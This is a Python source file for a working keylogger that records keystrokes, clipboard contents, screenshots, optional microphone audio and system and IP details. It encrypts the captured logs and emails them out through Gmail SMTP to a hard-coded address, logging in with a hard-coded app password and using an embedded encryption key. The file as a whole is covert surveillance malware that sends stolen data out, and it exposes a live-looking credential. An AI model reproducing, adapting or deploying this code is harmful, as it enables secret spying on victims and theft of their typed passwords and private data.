from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import subprocess

#Default Modules for Collection
import socket
import platform

#Clipboard Module
#import win32clipboard
#https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard

#Keystrokes 
from pynput.keyboard import Key, Listener

#Time
import time
import os

#Microphone
from scipy.io.wavfile import write
import sounddevice as sd

#Cryptography for encryption
from cryptography.fernet import Fernet

#Gitpass for username and requests for information
import getpass
from requests import get

#Screenshot image grab
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#default controls
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
email_address =  "keylogger4214389@gmail.com"
app_password = "ohtzogcxovolgjja"


microphone_time = 10
audio_information = "audio.wav"

keys_information_encrypted = "encrypted_key_log.txt"
system_information_encrypted = "encrypted_systeminfo.txt"
clipboard_information_encrypted = "ecrypted_clipboard.txt"

screenshot_information = "screenshot.png"
time_iteration = 15
number_of_iterations_end = 3

toaddress = "keylogger4214389@gmail.com"
key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="


file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
extend = "/"
file_merge = file_path + extend

def send_email(filename, attachment, toaddress):

    fromaddress = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "New Log File"

    body = "Body of the mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    
    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment: filename=%s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddress, app_password)

    text = msg.as_string()
    s.sendmail(fromaddress, toaddress, text)
    s.quit()

# send_email(keys_information, file_path + extend + keys_information, toaddress)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except:
            f.write("Couldn't get public IP Adress. Max Query")
        
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddress + '\n')
    
computer_information() 

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            cp = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
            cp.wait
            pasted_data = cp.stdout.read()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied. Clipboard may contain other media")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels = 1)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime: 
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    if currentTime > stoppingTime: 
        with open(file_path + extend + keys_information, "w") as f: 
            f.write(" ")
        
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddress)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_encrypted, file_merge + clipboard_information_encrypted, file_merge + keys_information_encrypted]

count = 0
for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], "rb") as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)
    
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddress)
    count += 1 

time.sleep(120)



